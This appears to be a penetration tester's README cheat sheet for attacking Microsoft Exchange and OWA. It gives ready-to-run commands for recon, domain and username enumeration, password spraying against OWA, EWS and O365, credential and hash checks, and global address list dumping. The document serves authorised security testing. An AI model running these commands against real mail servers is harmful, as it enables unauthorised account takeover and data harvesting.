**This repo is not near complete, and the info herein are only some of the notes i usually take during engagements, so feel free to contribute.**



## Check version 
- naviagte to the target's exchange site 
- open source code viewer 
- check the  following line  ( <link rel="shortcut icon" href="/owa/auth/15.1.1913/themes/resources/favicon.ico" type="image/x-icon"> )
- grep the version after /owa/auth 
- compare between verisons by using https://docs.microsoft.com/en-us/exchange/new-features/build-numbers-and-release-dates?view=exchserver-2019


# Reconnaissance ( OWA Discovery ) 
- _check_autodiscover <domain>
- nuclei -l alive.txt -t  ~/tools/templates/nuclei-templates/technologies/microsoft-echange-server-detect.yaml -c 200 -silent
- python3 ~/tools/fierce/fierce/fierce.py  --domain <domain> --subdomains mail email webmail zmail autodiscover --connect
- - ./ruler-linux64 -k  --domain mail.domain.com u  // check autodiscover as well as check office365
- recon-ng ( recon/domains-hosts/mx_spf_ip ) 



# Internal Domain Discovery
- check ssl for potenail valid name 
- use auxiliary/scanner/msmail/host_id
- python3 atomizer.py owa 'https://autodiscover.domain.com/autodiscover/autodiscover.xml' --recon
- Invoke-DomainHarvestOWA -ExchHostname mail.domain.com
- Invoke-DomainHarvestOWA -ExchHostname mail.domain.com  -OutFile potential-domains.txtt -CompanyName "company name"
- Invoke-DomainHarvestOWA -ExchHostname mail.domain.com -DomainList .\domainlist.txt -OutFile potentially-valid-domains.txt -Brute -domain <domain>


# Naming Schema Fuzzing 
- Invoke-EmailAddressMangler -FirstNamesList C:\Users\admin\Desktop\first-name.txt -LastNamesList C:\Users\admin\Desktop\last-name.txt -AddressConvention fn.ln | Out-File -Encoding ascii namelist.txt



# Endpoints 
- https://mail.domain.com/EWS/Exchange.asmx  ( EWS )


# Username Enuumeration 
- Invoke-UsernameHarvestOWA -UserList .\namelist.txt -ExchHostname mail.domain.com  -Domain  domain.com -OutFile valid-username.txt
- use auxiliary/scanner/msmail/onprem_enum
- use auxiliary/scanner/http/owa_login
- python3 o365spray.py --enum -d domain.com -U users    # O365 [[ supply users not emails ]] 


# password Discovery 
- Invoke-PasswordSprayOWA -ExchHostname mail.domain.com  -UserList .\valid-username.txt  -OutFile owa-sprayed-creds.txt -Threads 15 -Password password123
- Invoke-PasswordSprayEWS -ExchHostname mail.domain.com -UserList .\valid-username.txt -Password <pass> -Threads 15 -OutFile wes.creds 
- ./ruler-linux64 -k --domain domain.com brute --users /tmp/i --passwords /tmp/ii  --verbose   ( most reliable ) 
- python3 atomizer.py owa domain.com 'pass' <emails>
- use auxiliary/scanner/http/owa_login
- ~/tools/ruler-linux64 --o365 brute --users emails --passwords pp --verbose   # O365 
- python3 ~/tools/cloud-pentest/azure/o365spray/o365spray.py  --spray -U uu -P pp -d domain.com -l 5  # O365 [[ supply users not emails ]] 


# Credentials verification 
- ~/tools/ruler-linux64 --url 'https://autodiscover.mail.domain/autodiscover/autodiscover.xml'  --username <username> --password <password> --email <email> --insecure check
- ~/tools/ruler-linux64 --url 'https://autodiscover.mail.domain/autodiscover/autodiscover.xml'  --username <username> --hash <hash> --email <email> --insecure check


# GAL  
- Get-GlobalAddressList -ExchHostname mail.domain.com  -UserName  domain\user -Password asdqwe123  -OutFile GBL.txt




